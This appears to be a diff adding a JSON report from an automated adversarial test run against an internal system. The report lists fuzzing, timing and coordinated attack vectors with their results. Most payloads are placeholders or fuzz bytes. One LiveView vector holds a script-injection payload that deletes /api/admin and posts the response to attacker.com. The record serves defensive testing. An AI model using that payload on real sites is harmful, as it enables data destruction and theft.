@@ -1,0 +1,401 @@
+{
+  "timestamp": "2025-07-25T13:22:38.415669",
+  "summary": {
+    "total_permutations": 5,
+    "system_compromises": 3,
+    "avg_defense_effectiveness": 0.74,
+    "avg_evasion_success": 0.15
+  },
+  "attack_analysis": {
+    "most_successful_strategy": null,
+    "least_effective_defenses": [],
+    "critical_vulnerabilities": [],
+    "evasion_technique_effectiveness": {}
+  },
+  "recommendations": {
+    "immediate_actions": [],
+    "security_improvements": [],
+    "monitoring_enhancements": []
+  },
+  "detailed_results": [
+    {
+      "permutation": {
+        "permutation_id": "isolated_000",
+        "name": "Isolated signal_injection_malformed_binary_bitactor_core",
+        "description": "Single vector attack: input_fuzzing",
+        "test_vectors": [
+          {
+            "vector_id": "4f9f6c16d34c9372",
+            "name": "signal_injection_malformed_binary_bitactor_core",
+            "category": "input_fuzzing",
+            "target_component": "bitactor_core",
+            "attack_payload": {
+              "type": "binary",
+              "data": "XHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MVx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZmXHgwMFx4ZmZceDAwXHhmZlx4MDBceGZm",
+              "size": 1024,
+              "corruption_points": [
+                256,
+                512,
+                768
+              ]
+            },
+            "expected_defense": "input_validation_rejection",
+            "success_criteria": {
+              "defense_triggered": true,
+              "attack_detected": true,
+              "system_integrity_maintained": true,
+              "no_data_exfiltration": true,
+              "recovery_successful": true,
+              "detection_time_max_seconds": 30.0,
+              "recovery_time_max_seconds": 120.0,
+              "false_positive_rate_max": 0.05
+            },
+            "risk_level": "medium",
+            "execution_time_estimate": 5.0,
+            "prerequisites": [
+              "bitactor_running",
+              "nif_loaded"
+            ]
+          }
+        ],
+        "execution_order": "sequential",
+        "coordination_strategy": "independent",
+        "expected_system_response": "input_validation_rejection",
+        "detection_evasion_techniques": [],
+        "persistence_mechanisms": []
+      },
+      "start_time": "2025-07-25 13:21:29.585827",
+      "end_time": "2025-07-25 13:21:35.592495",
+      "vectors_executed": 1,
+      "vectors_successful": 1,
+      "system_compromised": true,
+      "defense_effectiveness": 0.8,
+      "detection_latency_seconds": 5.0,
+      "recovery_time_seconds": 0.5021929740905762,
+      "damage_assessment": {},
+      "evasion_success_rate": 0.0,
+      "lessons_learned": [
+        "High attack success rate (100.0%) indicates defense gaps",
+        "System compromise achieved - critical security review needed"
+      ]
+    },
+    {
+      "permutation": {
+        "permutation_id": "isolated_001",
+        "name": "Isolated signal_injection_timing_manipulation_bitactor_core",
+        "description": "Single vector attack: input_fuzzing",
+        "test_vectors": [
+          {
+            "vector_id": "60d56b1e962fedac",
+            "name": "signal_injection_timing_manipulation_bitactor_core",
+            "category": "input_fuzzing",
+            "target_component": "bitactor_core",
+            "attack_payload": {
+              "type": "timing",
+              "attack_timing": {
+                "delay": 50000,
+                "jitter": 5000.0
+              },
+              "target_window": "bitactor_dispatch",
+              "repetitions": 1000
+            },
+            "expected_defense": "input_validation_rejection",
+            "success_criteria": {
+              "defense_triggered": true,
+              "attack_detected": true,
+              "system_integrity_maintained": true,
+              "no_data_exfiltration": true,
+              "recovery_successful": true,
+              "detection_time_max_seconds": 30.0,
+              "recovery_time_max_seconds": 120.0,
+              "false_positive_rate_max": 0.05
+            },
+            "risk_level": "medium",
+            "execution_time_estimate": 10.0,
+            "prerequisites": [
+              "bitactor_running",
+              "nif_loaded"
+            ]
+          }
+        ],
+        "execution_order": "sequential",
+        "coordination_strategy": "independent",
+        "expected_system_response": "input_validation_rejection",
+        "detection_evasion_techniques": [],
+        "persistence_mechanisms": []
+      },
+      "start_time": "2025-07-25 13:21:40.594980",
+      "end_time": "2025-07-25 13:21:51.599904",
+      "vectors_executed": 1,
+      "vectors_successful": 1,
+      "system_compromised": true,
+      "defense_effectiveness": 0.8,
+      "detection_latency_seconds": 5.0,
+      "recovery_time_seconds": 0.5004749298095703,
+      "damage_assessment": {},
+      "evasion_success_rate": 0.0,
+      "lessons_learned": [
+        "High attack success rate (100.0%) indicates defense gaps",
+        "System compromise achieved - critical security review needed"
+      ]
+    },
+    {
+      "permutation": {
+        "permutation_id": "isolated_002",
+        "name": "Isolated signal_injection_memory_corruption_bitactor_core",
+        "description": "Single vector attack: input_fuzzing",
+        "test_vectors": [
+          {
+            "vector_id": "fcaf3c161bf2c1ce",
+            "name": "signal_injection_memory_corruption_bitactor_core",
+            "category": "input_fuzzing",
+            "target_component": "bitactor_core",
+            "attack_payload": {
+              "type": "generic",
+              "payload_type": "memory_corruption",
+              "target": "bitactor_core",
+              "data": "adversarial_test_memory_corruption_1753474889"
+            },
+            "expected_defense": "input_validation_rejection",
+            "success_criteria": {
+              "defense_triggered": true,
+              "attack_detected": true,
+              "system_integrity_maintained": true,
+              "no_data_exfiltration": true,
+              "recovery_successful": true,
+              "detection_time_max_seconds": 30.0,
+              "recovery_time_max_seconds": 120.0,
+              "false_positive_rate_max": 0.05
+            },
+            "risk_level": "medium",
+            "execution_time_estimate": 10.0,
+            "prerequisites": [
+              "bitactor_running",
+              "nif_loaded"
+            ]
+          }
+        ],
+        "execution_order": "sequential",
+        "coordination_strategy": "independent",
+        "expected_system_response": "input_validation_rejection",
+        "detection_evasion_techniques": [],
+        "persistence_mechanisms": []
+      },
+      "start_time": "2025-07-25 13:21:56.602192",
+      "end_time": "2025-07-25 13:22:07.608782",
+      "vectors_executed": 1,
+      "vectors_successful": 0,
+      "system_compromised": false,
+      "defense_effectiveness": 0.8,
+      "detection_latency_seconds": 5.0,
+      "recovery_time_seconds": 0.502155065536499,
+      "damage_assessment": {},
+      "evasion_success_rate": 0.0,
+      "lessons_learned": []
+    },
+    {
+      "permutation": {
+        "permutation_id": "isolated_003",
+        "name": "Isolated race_condition_concurrent_access_bitactor_core",
+        "description": "Single vector attack: timing_attack",
+        "test_vectors": [
+          {
+            "vector_id": "117fe23fe2a911d1",
+            "name": "race_condition_concurrent_access_bitactor_core",
+            "category": "timing_attack",
+            "target_component": "bitactor_core",
+            "attack_payload": {
+              "type": "generic",
+              "payload_type": "concurrent_access",
+              "target": "bitactor_core",
+              "data": "adversarial_test_concurrent_access_1753474889"
+            },
+            "expected_defense": "concurrency_control_lock",
+            "success_criteria": {
+              "defense_triggered": true,
+              "attack_detected": true,
+              "system_integrity_maintained": true,
+              "no_data_exfiltration": true,
+              "recovery_successful": true,
+              "detection_time_max_seconds": 30.0,
+              "recovery_time_max_seconds": 120.0,
+              "false_positive_rate_max": 0.05
+            },
+            "risk_level": "medium",
+            "execution_time_estimate": 10.0,
+            "prerequisites": [
+              "concurrent_access_available",
+              "timing_precision"
+            ]
+          }
+        ],
+        "execution_order": "sequential",
+        "coordination_strategy": "independent",
+        "expected_system_response": "concurrency_control_lock",
+        "detection_evasion_techniques": [],
+        "persistence_mechanisms": []
+      },
+      "start_time": "2025-07-25 13:22:12.611025",
+      "end_time": "2025-07-25 13:22:23.414601",
+      "vectors_executed": 1,
+      "vectors_successful": 0,
+      "system_compromised": false,
+      "defense_effectiveness": 0.8,
+      "detection_latency_seconds": 5.0,
+      "recovery_time_seconds": 0.5011720657348633,
+      "damage_assessment": {},
+      "evasion_success_rate": 0.0,
+      "lessons_learned": []
+    },
+    {
+      "permutation": {
+        "permutation_id": "coordinated_000",
+        "name": "Coordinated Assault #1",
+        "description": "Simultaneous attack on 4 components",
+        "test_vectors": [
+          {
+            "vector_id": "8aabf5aecbda1954",
+            "name": "data_exfiltration_log_injection_cns_forge_main",
+            "category": "data_exfiltration",
+            "target_component": "cns_forge_main",
+            "attack_payload": {
+              "type": "generic",
+              "payload_type": "log_injection",
+              "target": "cns_forge_main",
+              "data": "adversarial_test_log_injection_1753474889"
+            },
+            "expected_defense": "access_control_block",
+            "success_criteria": {
+              "defense_triggered": true,
+              "attack_detected": true,
+              "system_integrity_maintained": true,
+              "no_data_exfiltration": true,
+              "recovery_successful": true,
+              "detection_time_max_seconds": 30.0,
+              "recovery_time_max_seconds": 120.0,
+              "false_positive_rate_max": 0.05
+            },
+            "risk_level": "medium",
+            "execution_time_estimate": 10.0,
+            "prerequisites": [
+              "target_component_available"
+            ]
+          },
+          {
+            "vector_id": "9df80377881e1b87",
+            "name": "ui_manipulation_liveview_injection_dashboard_mission_control",
+            "category": "logic_bombing",
+            "target_component": "dashboard_mission_control",
+            "attack_payload": {
+              "type": "liveview_event",
+              "event": "phx_click",
+              "payload": "<script>fetch('/api/admin',{method:'DELETE'}).then(r=>fetch('http://attacker.com',{method:'POST',body:JSON.stringify({stolen:r})}))</script>",
+              "target": "#dashboard_mission_control_container",
+              "bypass_csrf": true
+            },
+            "expected_defense": "content_security_policy_block",
+            "success_criteria": {
+              "defense_triggered": true,
+              "attack_detected": true,
+              "system_integrity_maintained": true,
+              "no_data_exfiltration": true,
+              "recovery_successful": true,
+              "detection_time_max_seconds": 30.0,
+              "recovery_time_max_seconds": 120.0,
+              "false_positive_rate_max": 0.05
+            },
+            "risk_level": "medium",
+            "execution_time_estimate": 12.0,
+            "prerequisites": [
+              "dashboard_access",
+              "websocket_connection"
+            ]
+          },
+          {
+            "vector_id": "7031814fd06eff9a",
+            "name": "supply_chain_registry_manipulation_k8s_infrastructure",
+            "category": "supply_chain_attack",
+            "target_component": "k8s_infrastructure",
+            "attack_payload": {
+              "type": "generic",
+              "payload_type": "registry_manipulation",
+              "target": "k8s_infrastructure",
+              "data": "adversarial_test_registry_manipulation_1753474889"
+            },
+            "expected_defense": "signature_verification_failure",
+            "success_criteria": {
+              "defense_triggered": true,
+              "attack_detected": true,
+              "system_integrity_maintained": true,
+              "no_data_exfiltration": true,
+              "recovery_successful": true,
+              "detection_time_max_seconds": 30.0,
+              "recovery_time_max_seconds": 120.0,
+              "false_positive_rate_max": 0.05
+            },
+            "risk_level": "medium",
+            "execution_time_estimate": 10.0,
+            "prerequisites": [
+              "target_component_available"
+            ]
+          },
+          {
+            "vector_id": "5e188cf792b3f4e9",
+            "name": "knowledge_extraction_inference_attack_semantic_engine",
+            "category": "data_exfiltration",
+            "target_component": "semantic_engine",
+            "attack_payload": {
+              "type": "generic",
+              "payload_type": "inference_attack",
+              "target": "semantic_engine",
+              "data": "adversarial_test_inference_attack_1753474889"
+            },
+            "expected_defense": "query_access_denied",
+            "success_criteria": {
+              "defense_triggered": true,
+              "attack_detected": true,
+              "system_integrity_maintained": true,
+              "no_data_exfiltration": true,
+              "recovery_successful": true,
+              "detection_time_max_seconds": 30.0,
+              "recovery_time_max_seconds": 120.0,
+              "false_positive_rate_max": 0.05
+            },
+            "risk_level": "medium",
+            "execution_time_estimate": 10.0,
+            "prerequisites": [
+              "target_component_available"
+            ]
+          }
+        ],
+        "execution_order": "parallel",
+        "coordination_strategy": "coordinated",
+        "expected_system_response": "multiple_defense_activation",
+        "detection_evasion_techniques": [
+          "traffic_mimicry",
+          "timing_evasion"
+        ],
+        "persistence_mechanisms": [
+          "memory_resident",
+          "process_injection"
+        ]
+      },
+      "start_time": "2025-07-25 13:22:28.415860",
+      "end_time": "2025-07-25 13:22:33.414469",
+      "vectors_executed": 4,
+      "vectors_successful": 4,
+      "system_compromised": true,
+      "defense_effectiveness": 0.5000000000000001,
+      "detection_latency_seconds": 15.0,
+      "recovery_time_seconds": 2.001183032989502,
+      "damage_assessment": {},
+      "evasion_success_rate": 0.75,
+      "lessons_learned": [
+        "High attack success rate (100.0%) indicates defense gaps",
+        "System compromise achieved - critical security review needed",
+        "Evasion techniques (traffic_mimicry, timing_evasion) need specific countermeasures",
+        "Multi-component attack highlights need for unified security monitoring"
+      ]
+    }
+  ]
+}
